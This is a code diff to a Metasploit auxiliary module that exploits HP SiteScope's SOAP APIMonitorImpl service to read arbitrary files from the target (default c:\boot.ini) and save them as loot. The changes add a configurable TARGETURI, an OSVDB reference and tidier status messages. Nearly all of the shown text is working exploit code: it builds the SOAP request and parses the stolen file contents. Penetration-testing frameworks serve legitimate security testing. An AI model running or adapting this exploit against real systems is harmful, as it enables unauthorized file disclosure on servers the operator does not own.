@@ -25,7 +25,7 @@ class Metasploit4 < Msf::Auxiliary
 			},
 			'References'   =>
 				[
-					#[ 'OSVDB', '' ],
+					[ 'OSVDB', '85118' ],
 					[ 'BID', '55269' ],
 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-177/' ]
 				],
@@ -40,8 +40,8 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 		[
 			Opt::RPORT(8080),
-			OptString.new('RFILE', [true, 'Remote File', 'c:\\boot.ini'])
-
+			OptString.new('RFILE', [true, 'Remote File', 'c:\\boot.ini']),
+			OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/']),
 		], self.class)
 
 		register_autofilter_ports([ 8080 ])
@@ -53,12 +53,18 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
+		@peer = "#{rhost}:#{rport}"
+		@uri = target_uri.path
+		@uri << '/' if @uri[-1,1] != '/'
+
+		print_status("#{@peer} - Connecting to SiteScope SOAP Interface")
+
 		res = send_request_cgi({
-			'uri'     => '/SiteScope/services/APIMonitorImpl',
+			'uri'     => "#{@uri}services/APIMonitorImpl",
 			'method'  => 'GET'})
 
 		if not res
-			print_error("#{rhost}:#{rport} - Unable to connect")
+			print_error("#{@peer} - Unable to connect")
 			return
 		end
 
@@ -66,7 +72,6 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def accessfile
-		print_status("#{rhost}:#{rport} - Connecting to SiteScope SOAP Interface")
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -88,8 +93,10 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Body>" + "\r\n"
 		data << "</wsns0:Envelope>" + "\r\n"
 
+		print_status("#{@peer} - Retrieving the file contents")
+
 		res = send_request_cgi({
-			'uri'      => '/SiteScope/services/APIMonitorImpl',
+			'uri'      => "#{@uri}services/APIMonitorImpl",
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -100,16 +107,16 @@ class Metasploit4 < Msf::Auxiliary
 		if res and res.code == 200 and res.body =~ /<loadFileContentReturn xsi:type="xsd:string">(.*)<\/loadFileContentReturn>/m
 			loot = CGI.unescapeHTML($1)
 			if not loot or loot.empty?
-				print_status("#{rhost}#{rport} - Retrieved empty file")
+				print_status("#{@peer} - Retrieved empty file")
 				return
 			end
 			f = ::File.basename(datastore['RFILE'])
 			path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-			print_status("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
+			print_status("#{@peer} - #{datastore['RFILE']} saved in #{path}")
 			return
 		end
 
-		print_error("#{rhost}#{rport} - Failed to retrieve file")
+		print_error("#{@peer} - Failed to retrieve the file")
 	end
 
 end
